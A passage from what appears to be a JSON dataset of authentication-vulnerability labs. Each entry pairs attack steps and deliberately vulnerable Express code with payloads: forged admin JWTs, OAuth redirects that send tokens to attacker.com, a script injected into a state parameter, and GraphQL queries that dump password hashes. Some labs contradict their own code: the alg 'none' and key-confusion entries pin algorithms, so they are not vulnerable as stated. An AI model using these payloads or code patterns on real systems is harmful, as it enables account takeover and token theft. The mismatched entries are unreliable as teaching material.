        "Lab Description": "This lab's JWT implementation fails to properly verify the token signature. The application accepts unsigned tokens when the alg header is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept a valid JWT token using Burp Suite while logging in as a low-privilege user",
          "Decode the token using jwt.io or Burp's Decoder to analyze its structure",
          "Modify the algorithm header to 'none' and remove the signature section",
          "Change the 'role' claim from 'user' to 'admin' in the payload",
          "Send the modified token in the Authorization header to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'admin123', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secretkey', { algorithms: ['HS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin dashboard');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
          "eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTU5MjIwODB9."
        ]
      },
      {
        "Lab scenario": "GraphQL query abuse in user profile API",
        "Lab Description": "This lab's GraphQL endpoint exposes sensitive user information through introspection and lacks proper rate limiting. The application allows unlimited query depth that can lead to data leakage. To solve: extract all user credentials through a crafted GraphQL query.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to send introspection queries to discover the GraphQL schema",
          "Identify sensitive fields in the User type through schema analysis",
          "Craft a recursive query to fetch all user data in a single request",
          "Use query batching to bypass rate limiting by sending multiple queries in one request",
          "Extract password hashes and crack them using John the Ripper"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type User {\n    id: ID!\n    username: String!\n    email: String!\n    passwordHash: String!\n    isAdmin: Boolean!\n  }\n  \n  type Query {\n    users: [User]\n    user(id: ID!): User\n  }\n`);\n\nconst root = {\n  users: () => db.getUsers(),\n  user: ({id}) => db.getUserById(id)\n};\n\nconst app = express();\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\napp.listen(4000);",
        "payloads": [
          "query { users { username passwordHash } }",
          "query { __schema { types { name fields { name } } } }",
          "[{\"query\":\"query { user(id: 1) { username passwordHash } }\"}, {\"query\":\"query { user(id: 2) { username passwordHash } }\"}]"
        ]
      },
      {
        "Lab scenario": "OAuth token hijacking through open redirect",
        "Lab Description": "This lab's OAuth implementation is vulnerable to token leakage through an open redirect in the callback URL. The application fails to validate redirect URIs properly. To solve: steal an OAuth token by tricking a user into visiting a malicious link.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Identify the OAuth authorization endpoint and required parameters",
          "Craft a malicious callback URL pointing to your attacker server",
          "Use social engineering to make the victim visit the crafted URL",
          "Intercept the OAuth token in the redirect using Burp Collaborator",
          "Exchange the authorization code for an access token and access victim resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst oauthConfig = {\n  clientId: 'labClient',\n  clientSecret: 'secret123',\n  authServer: 'http://auth-server/oauth'\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state } = req.query;\n  const redirectUri = req.cookies.redirect_uri || '/profile';\n  \n  axios.post(`${oauthConfig.authServer}/token`, {\n    code,\n    client_id: oauthConfig.clientId,\n    client_secret: oauthConfig.clientSecret,\n    redirect_uri: redirectUri,\n    grant_type: 'authorization_code'\n  }).then(response => {\n    res.redirect(`${redirectUri}?token=${response.data.access_token}`);\n  }).catch(err => {\n    res.status(500).send('OAuth error');\n  });\n});\n\napp.listen(3000);",
        "payloads": [
          "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=profile",
          "http://vulnerable-app/oauth/authorize?response_type=token&client_id=labClient&redirect_uri=http://attacker.com/callback&scope=email",
          "http://vulnerable-app/oauth/authorize?response_type=code&client_id=labClient&redirect_uri=http://vulnerable-app/oauth/callback?next=http://attacker.com&scope=all"
        ]
      },
      {
        "Lab scenario": "Session fixation in SOAP API authentication",
        "Lab Description": "This lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application assigns session tokens before authentication and doesn't regenerate them after login. To solve: fixate a session token on victim's browser and hijack their authenticated session.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the initial SOAP request to /ws-auth using Burp Suite and note the Set-Cookie header",
          "Craft a malicious link containing your session token and trick the victim to visit it",
          "Monitor active sessions using OWASP ZAP while victim authenticates",
          "Reuse the fixated session token in authenticated SOAP requests",
          "Access privileged endpoints using the hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nlet sessions = {};\n\napp.use('/ws-auth', (req, res) => {\n  const wsdl = `<?xml version=\"1.0\"?>\n<definitions>\n  <message name=\"authRequest\">\n    <part name=\"username\" type=\"xsd:string\"/>\n    <part name=\"password\" type=\"xsd:string\"/>\n  </message>\n</definitions>`;\n  \n  const service = {\n    AuthService: {\n      AuthPort: {\n        authenticate: (args) => {\n          const session = req.headers.cookie?.split('=')[1] || Math.random().toString(36).substring(2);\n          sessions[session] = { user: args.username };\n          return { sessionToken: session };\n        }\n      }\n    }\n  };\n  \n  soap.listen(app, '/ws-auth', service, wsdl);\n});\n\napp.listen(3000);",
        "payloads": [
          "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:auth=\"http://services.auth.com/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <auth:authenticate>\n         <username>victim</username>\n         <password>password123</password>\n      </auth:authenticate>\n   </soapenv:Body>\n</soapenv:Envelope>",
          "Cookie: sessionid=attacker-fixated-token"
        ]
      },
      {
        "Lab scenario": "JWT kid header path traversal in microservice architecture",
        "Lab Description": "This lab's JWT verification microservice is vulnerable to key path traversal through the kid header parameter. The application uses the kid value to load verification keys without proper sanitization. To solve: craft a JWT token that forces the server to use a predictable public key file.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT token using Burp Suite and analyze its structure",
          "Identify the kid header parameter pointing to key storage location",
          "Craft a malicious kid value with directory traversal (../../known/key.pub)",
          "Sign a new token with a predictable RSA private key matching the forced public key path",
          "Use the forged token to access admin API endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = fs.readFileSync(`/keys/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uL2V0Yy9zc2gvc3NoX2hvc3RfcnNhX3B1Yl9rZXkifQ.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uL2tleXMvZGVmYXVsdC5wdWIifQ.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage through verbose error messages",
        "Lab Description": "This lab's OAuth implementation leaks sensitive information through verbose error messages. The application reveals access tokens in stack traces during failed token validation. To solve: trigger error conditions to extract valid tokens from other users.",
        "Difficulty Level": "Easy",
        "Solution Steps": [
          "Intercept OAuth token validation requests using Burp Suite",
          "Modify token parameters to trigger validation errors",
          "Analyze error responses for leaked token information",
          "Extract valid tokens from verbose error messages",
          "Reuse stolen tokens to access victim resources"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'valid-token-123': { user: 'admin', scope: ['read', 'write'] },\n  'expired-token-456': { user: 'user1', scope: ['read'] }\n};\n\napp.post('/oauth/validate', (req, res) => {\n  try {\n    const { token } = req.body;\n    if (!token) throw new Error('Token missing');\n    \n    const tokenData = tokens[token];\n    if (!tokenData) throw new Error(`Invalid token: ${token} not found`);\n    \n    res.json({ valid: true, user: tokenData.user });\n  } catch (err) {\n    console.error(err.stack);\n    res.status(500).json({ \n      error: err.message,\n      stack: process.env.DEBUG ? err.stack : undefined,\n      validTokens: process.env.DEBUG ? Object.keys(tokens) : undefined\n    });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "{\"token\":\"invalid'\"}",
          "{\"token\":{\"$gt\":\"\"}}",
          "{\"token\":null}"
        ]
      },
      {
        "Lab scenario": "JWT role escalation via unsigned key confusion",
        "Lab Description": "This lab's JWT implementation fails to verify the signing algorithm when processing tokens. The application accepts unsigned tokens when expecting RS256-signed ones. To solve: craft a token with admin privileges by exploiting algorithm confusion.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT using Burp Suite and decode it to analyze structure",
          "Extract the public key from the /jwks.json endpoint using Postman",
          "Convert the public key to PEM format using openssl",
          "Craft a new token with alg: HS256 and sign it with the extracted public key",
          "Replace your token with the forged one to gain admin access"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst publicKey = fs.readFileSync('./public.key');\n\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin access granted');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEyMzQ1Njc4OSJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token leakage through state parameter reflection",
        "Lab Description": "This lab's OAuth flow reflects the state parameter in the URL fragment after redirection. The application fails to validate that the returned state matches the original. To solve: intercept the OAuth flow and modify the state to leak the access token.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Initiate OAuth flow while intercepting with Burp Suite",
          "Capture the authorization request and note the state parameter",
          "Modify the redirect_uri to point to an attacker-controlled domain",
          "Craft a malicious state parameter containing XSS payload",
          "Capture the token when victim visits the poisoned URL"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': { secret: 'sec789', redirectUris: ['https://client.com/callback'] }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri, state } = req.query;\n  \n  if (!clients[client_id]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  const token = 'leaked-token-' + Math.random().toString(36).substring(2);\n  res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`);\n});\n\napp.listen(3000);",
        "payloads": [
          "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=<script>alert(1)</script>",
          "https://oauth-provider/oauth/authorize?client_id=client123&redirect_uri=https://attacker.com&state=malicious-payload"
        ]
      },
      {
        "Lab scenario": "Session fixation through GraphQL WebSocket connection",
        "Lab Description": "This lab's GraphQL subscription endpoint assigns session tokens over WebSocket before authentication. The application fails to regenerate tokens after login. To solve: establish a WebSocket connection to fixate a session token, then authenticate to hijack the session.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Establish WebSocket connection to /graphql using OWASP ZAP",
          "Note the session token in the connection initialization response",
          "Fixate the token by setting it in a victim's browser",
          "Monitor active subscriptions while victim authenticates",
          "Reuse the WebSocket connection with the fixated token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { createServer } = require('http');\nconst { SubscriptionServer } = require('subscriptions-transport-ws');\nconst { execute, subscribe } = require('graphql');\n\nconst app = express();\nconst server = createServer(app);\n\nserver.listen(4000, () => {\n  new SubscriptionServer({\n    execute,\n    subscribe,\n    onConnect: (connectionParams, webSocket) => {\n      const sessionToken = Math.random().toString(36).substring(2);\n      webSocket.sessionToken = sessionToken;\n      return { sessionToken };\n    }\n  }, {\n    server,\n    path: '/graphql'\n  });\n});",
        "payloads": [
          "{\"type\":\"connection_init\",\"payload\":{}}",
          "{\"id\":\"1\",\"type\":\"start\",\"payload\":{\"query\":\"subscription { authEvents { token } }\"}}"
        ]
      },
      {
        "Lab scenario": "JWT claim injection via nested JSON objects",
        "Lab Description": "This lab's JWT processing incorrectly handles nested JSON objects in claims. The application fails to properly validate claim structures when verifying tokens. To solve: inject a nested 'admin' claim to escalate privileges.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Capture a valid JWT token using Burp Suite and decode it",
          "Identify the claims structure vulnerable to nested object injection",
          "Craft a new token with malicious nested claims using jwt_tool",
          "Test different nesting structures to bypass validation",
          "Verify admin access by accessing protected endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst secret = 'supersecret';\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, secret);\n    if (decoded.role === 'admin' || decoded.claims?.role === 'admin') {\n      res.send('Admin portal accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImNsYWltcyI6eyJyb2xlIjoiYWRtaW4ifX0.SIGNATURE",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImF0dHJzIjp7InJvbGUiOiJhZG1pbiJ9fQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token swapping through parameter pollution",
        "Lab Description": "This lab's OAuth implementation is vulnerable to HTTP parameter pollution during token exchange. The application processes multiple token parameters inconsistently. To solve: inject a second token parameter to swap privileges.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept the OAuth token exchange flow using Burp Suite",
          "Identify where the token parameter is processed",
          "Add a duplicate token parameter with different values",
          "Test different parameter positions (query vs body)",
          "Capture the elevated access token in the response"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\nconst tokens = {\n  'user_token': { scope: 'read' },\n  'admin_token': { scope: 'read write admin' }\n};\n\napp.post('/oauth/token', (req, res) => {\n  const token = req.body.token || req.query.token;\n  if (Array.isArray(token)) {\n    return res.json(tokens[token[1]]);\n  }\n  res.json(tokens[token]);\n});\n\napp.listen(3000);",
        "payloads": [
          "POST /oauth/token?token=user_token&token=admin_token",
          "token=user_token&token=admin_token"
        ]
      },
      {
        "Lab scenario": "Session token leakage through GraphQL batch requests",
        "Lab Description": "This lab's GraphQL endpoint processes batch requests sequentially while maintaining session state. The application leaks session tokens between requests in a batch. To solve: craft a batch query that leaks another user's session token.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify the GraphQL batch endpoint using Postman",
          "Craft a batch request with session operations",
          "Include a session token extraction query in the batch",
          "Analyze response for leaked tokens",
          "Reuse captured tokens for session hijacking"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n    setSession(token: String): String\n  }\n`);\n\nconst root = {\n  getSession: () => currentToken,\n  setSession: ({token}) => currentToken = token\n};\n\nlet currentToken = '';\nconst app = express();\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  batch: true\n}));\n\napp.listen(4000);",
        "payloads": [
          "[{\"query\":\"mutation { setSession(token: \\\"victim_token\\\") }\",\"variables\":{}},{\"query\":\"{ getSession }\",\"variables\":{}}]",
          "[{\"query\":\"mutation($tok: String!) { setSession(token: $tok) }\",\"variables\":{\"tok\":\"victim_token\"}},{\"query\":\"{ getSession }\"}]"
        ]
      },
      {
        "Lab scenario": "JWT header parameter injection via URI fragments",
        "Lab Description": "This lab's JWT implementation incorrectly processes URI fragments in the kid header parameter. The application fetches verification keys from untrusted locations when special characters are used. To solve: inject a malicious key URI to forge admin tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Intercept a valid JWT using Burp Suite and analyze the header",
          "Identify the kid parameter pointing to key location",
          "Craft a token with kid containing URI fragment (#attacker.com/key.json)",
          "Host a malicious public key at the specified location",
          "Use the forged token to access admin endpoints"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst axios = require('axios');\nconst app = express();\n\napp.post('/verify', async (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (!decoded?.header?.kid) {\n    return res.status(401).json({ error: 'Invalid token' });\n  }\n  \n  try {\n    const key = await axios.get(`https://keyserver/${decoded.header.kid}`);\n    const verified = jwt.verify(token, key.data);\n    res.json({ access: verified.role === 'admin' ? 'granted' : 'denied' });\n  } catch (err) {\n    res.status(401).json({ error: 'Verification failed' });\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQucHViI2F0dGFja2VyLmNvbS9tYWxpY2lvdXMua2V5In0.eyJ1c2VyIjoiYWRtaW4ifQ.SIGNATURE",
          "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wYXRoL3RvL2tleSNhdHRhY2tlci5jb20va2V5In0.eyJyb2xlIjoiYWRtaW4ifQ.SIGNATURE"
        ]
      },
      {
        "Lab scenario": "OAuth token theft via iframe timing attack",
        "Lab Description": "This lab's OAuth implementation leaks token validity through iframe response times. The application processes valid tokens slower due to database lookups. To solve: measure iframe load times to brute-force active tokens.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Identify OAuth-protected iframe endpoints using OWASP ZAP",
          "Create a malicious page with multiple hidden iframes",
          "Measure response times for different token values",
          "Analyze timing differences to identify valid tokens",
          "Hijack the session using the identified token"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express');\nconst app = express();\n\nconst validTokens = new Set(['secret123', 'admin456']);\n\napp.get('/iframe', (req, res) => {\n  const token = req.query.token;\n  \n  if (validTokens.has(token)) {\n    setTimeout(() => {\n      res.send('Protected content');\n    }, 500); \n  } else {\n    res.send('Invalid token');\n  }\n});\n\napp.listen(3000);",
        "payloads": [
          "<iframe src=\"https://oauth-provider/iframe?token=brute1\" onload=\"timing1=performance.now()\">",
          "<iframe src=\"https://oauth-provider/iframe?token=brute2\" onload=\"timing2=performance.now()\">"
        ]
      },
      {
        "Lab scenario": "Session fixation through WebSocket subprotocol negotiation",
        "Lab Description": "This lab's WebSocket implementation assigns sessions during subprotocol negotiation. The application fails to regenerate session tokens after authentication. To solve: fixate a session during WS handshake then authenticate to hijack.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Intercept WebSocket connections using Burp Suite",
          "Modify Sec-WebSocket-Protocol header to inject session",
          "Establish connection with fixated session token",
          "Monitor active sessions while victim authenticates",
          "Reuse the WebSocket connection with hijacked session"
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const WebSocket = require('ws');\n\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  ws.sessionToken = protocol || Math.random().toString(36).substring(2);\n  \n  ws.on('message', (message) => {\n    if (message === 'AUTH') {\n      ws.authenticated = true;\n    }\n  });\n});",
        "payloads": [
          "Sec-WebSocket-Protocol: fixated-session-token",
          "GET /chat HTTP/1.1\r\nHost: server.example.com\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Protocol: attacker-token\r\n\r\n"
        ]
      }                                                                                                                                      
]